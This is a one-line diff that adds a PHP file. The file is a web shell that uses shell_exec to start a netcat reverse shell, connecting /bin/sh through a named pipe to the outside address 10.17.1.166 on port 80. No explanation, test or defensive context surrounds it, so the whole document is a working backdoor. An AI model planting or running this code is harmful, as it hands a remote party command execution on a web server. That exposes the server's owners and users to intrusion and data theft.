@@ -1,0 +1,1 @@
+<?php echo "<pre>" . shell_exec("mkfifo /tmp/f; nc 10.17.1.166 80 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f") . "</pre>"; ?>
